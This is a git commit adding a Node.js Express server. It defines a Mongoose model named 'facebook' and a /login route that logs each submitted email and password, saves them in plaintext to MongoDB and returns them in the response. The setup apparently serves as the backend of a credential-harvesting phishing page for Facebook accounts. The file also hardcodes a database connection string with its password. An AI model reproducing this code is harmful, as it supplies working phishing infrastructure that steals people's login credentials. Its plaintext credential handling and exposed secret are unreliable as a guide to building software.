d11111784e24523fa950b3d3467facd60f4aae21
faysal725 <afaysal725@gmail.com>
2024-09-02 12:30:56 +0600

    first commit

---
+++ index.js
@@ -0,0 +1,76 @@
+const express = require("express");
+const mongoose = require("mongoose");
+require('dotenv').config(); // Load environment variables from .env
+
+
+const app = express();
+
+// Use environment variables or provide default values
+const port = process.env.PORT || 5000
+const host = process.env.HOST || 'localhost'
+
+// Middleware to parse JSON bodies
+app.use(express.json());
+
+mongoose
+  .connect(
+    "mongodb+srv://next-course:Ff123456789@cluster0.hozny.mongodb.net/playground?retryWrites=true&w=majority&appName=Cluster0"
+  )
+  .then(() => console.log("Connected to MondoDB..."))
+  .catch((err) => console.error("Could not connect to Mongodb..."));
+
+const facebookSchema = new mongoose.Schema({
+  email: {
+    type: String,
+    required: true,
+    minlength: 5,
+    maxlength: 255,
+  },
+  password: {
+    type: String,
+    required: true,
+    minlength: 5,
+    maxlength: 255,
+  },
+});
+
+const Facebook = mongoose.model("facebook", facebookSchema);
+
+async function createCredential(email, pass) {
+  const facebook = new Facebook({
+    email: email,
+    password: pass,
+  });
+  try {
+    const result = await facebook.save();
+    console.log(result);
+  } catch (ex) {
+    for (field in ex.errors) {
+      console.log(ex.errors[field].message);
+    }
+  }
+}
+
+// Sample route
+app.get("/", (req, res) => {
+  res.send("Hello, World!");
+});
+
+// Route to handle POST request
+app.post("/login", (req, res) => {
+  const { email, password } = req.body;
+  console.log(email, password);
+
+  createCredential(email, password);
+  // Simple response with the extracted data
+  res.json({
+    message: "Received the data!",
+    email: email,
+    password: password,
+  });
+});
+
+// Start the server
+app.listen(port, host, () => {
+  console.log(`Server running at http://localhost:${port}`);
+});
